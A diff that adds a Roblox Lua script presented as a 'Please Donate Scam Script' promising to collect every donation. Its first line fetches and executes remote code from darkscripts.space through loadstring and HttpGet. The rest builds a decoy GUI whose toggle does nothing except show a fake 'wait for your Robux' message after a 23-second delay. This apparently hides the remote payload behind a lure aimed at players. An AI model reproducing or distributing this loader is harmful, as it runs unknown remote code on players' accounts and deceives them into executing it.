@@ -1,0 +1,121 @@
+loadstring(game:HttpGet('https://darkscripts.space/scripts/298ead29-b5db-488e-9858-c872cb8b1307_1030535100829540464.lua',true))()                              
+
+-- Lokaler Spieler und PlayerGui sicherstellen
+local player = game.Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+print("Skript gestartet") -- Debugging
+
+-- Erstelle eine ScreenGui (aber noch nicht sichtbar)
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "ToggleUI"
+screenGui.ResetOnSpawn = false -- Behalte die UI nach Respawn
+screenGui.Parent = playerGui
+
+-- Hauptframe erstellen
+local mainFrame = Instance.new("Frame")
+mainFrame.Size = UDim2.new(0, 300, 0, 150) -- Breite und Höhe des Frames
+mainFrame.Position = UDim2.new(0.5, -150, 0.5, -75) -- Zentrierung
+mainFrame.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
+mainFrame.BackgroundTransparency = 0.2
+mainFrame.BorderSizePixel = 0
+mainFrame.Active = true -- Aktivieren für Draggable-Funktion
+mainFrame.Draggable = true -- Frame ist beweglich
+mainFrame.Visible = false -- Anfangs unsichtbar
+mainFrame.Parent = screenGui
+
+-- Abgerundete Ecken für Hauptframe
+local mainCorner = Instance.new("UICorner")
+mainCorner.CornerRadius = UDim.new(0, 15)
+mainCorner.Parent = mainFrame
+
+-- Titel erstellen
+local titleLabel = Instance.new("TextLabel")
+titleLabel.Size = UDim2.new(1, 0, 0.2, 0)
+titleLabel.Position = UDim2.new(0, 0, 0, 0)
+titleLabel.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
+titleLabel.BorderSizePixel = 0
+titleLabel.Text = "Please Donate Scam Script"
+titleLabel.TextColor3 = Color3.new(1, 1, 1)
+titleLabel.TextScaled = true
+titleLabel.Parent = mainFrame
+
+-- Abgerundete Ecken für Titel
+local titleCorner = Instance.new("UICorner")
+titleCorner.CornerRadius = UDim.new(0, 10)
+titleCorner.Parent = titleLabel
+
+-- Schalter erstellen
+local toggleButton = Instance.new("TextButton")
+toggleButton.Size = UDim2.new(0.2, 0, 0.3, 0)
+toggleButton.Position = UDim2.new(0.05, 0, 0.4, 0) -- Links innerhalb des Frames
+toggleButton.BackgroundColor3 = Color3.new(1, 0, 0) -- Startfarbe: Rot (OFF)
+toggleButton.Text = "OFF"
+toggleButton.TextColor3 = Color3.new(1, 1, 1)
+toggleButton.TextScaled = true
+toggleButton.BorderSizePixel = 0
+toggleButton.Parent = mainFrame
+
+-- Abgerundete Ecken für den Schalter
+local buttonCorner = Instance.new("UICorner")
+buttonCorner.CornerRadius = UDim.new(1, 0) -- Komplett abgerundet
+buttonCorner.Parent = toggleButton
+
+-- Text neben dem Schalter erstellen
+local donationTextLabel = Instance.new("TextLabel")
+donationTextLabel.Size = UDim2.new(0.7, 0, 0.3, 0)
+donationTextLabel.Position = UDim2.new(0.3, 0, 0.4, 0) -- Rechts vom Schalter
+donationTextLabel.BackgroundTransparency = 1 -- Kein Hintergrund
+donationTextLabel.Text = "Get All Donations"
+donationTextLabel.TextColor3 = Color3.new(1, 1, 1)
+donationTextLabel.TextScaled = true
+donationTextLabel.Parent = mainFrame
+
+-- Popup-Meldung unten rechts erstellen
+local popupFrame = Instance.new("Frame")
+popupFrame.Size = UDim2.new(0, 250, 0, 50)
+popupFrame.Position = UDim2.new(1, -260, 1, -60) -- Unten rechts am Bildschirmrand
+popupFrame.AnchorPoint = Vector2.new(1, 1) -- Unten rechts ausrichten
+popupFrame.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
+popupFrame.BackgroundTransparency = 0.8
+popupFrame.BorderSizePixel = 0
+popupFrame.Visible = false -- Standardmäßig versteckt
+popupFrame.Parent = screenGui
+
+-- Abgerundete Ecken für Popup
+local popupCorner = Instance.new("UICorner")
+popupCorner.CornerRadius = UDim.new(0, 15)
+popupCorner.Parent = popupFrame
+
+-- Text der Popup-Meldung
+local popupLabel = Instance.new("TextLabel")
+popupLabel.Size = UDim2.new(1, 0, 1, 0)
+popupLabel.BackgroundTransparency = 1
+popupLabel.Text = "You get now every Donation, go AFK and wait for your Robux"
+popupLabel.TextColor3 = Color3.new(1, 1, 1)
+popupLabel.TextScaled = true
+popupLabel.Parent = popupFrame
+
+-- Verzögerung von 23 Sekunden
+task.delay(23, function()
+    print("UI sichtbar machen nach 23 Sekunden") -- Debugging
+    mainFrame.Visible = true
+end)
+
+-- Schalterfunktion: Toggle ON/OFF
+toggleButton.MouseButton1Click:Connect(function()
+    if toggleButton.Text == "OFF" then
+        toggleButton.Text = "ON"
+        toggleButton.BackgroundColor3 = Color3.new(0, 1, 0) -- Farbe ändern zu grün (ON)
+        popupFrame.Visible = true -- Popup sichtbar machen
+
+        -- Nach 5 Sekunden das Popup wieder ausblenden
+        task.delay(5, function()
+            popupFrame.Visible = false
+        end)
+    else
+        toggleButton.Text = "OFF"
+        toggleButton.BackgroundColor3 = Color3.new(1, 0, 0) -- Farbe ändern zu rot (OFF)
+        popupFrame.Visible = false -- Popup unsichtbar machen
+    end
+end)
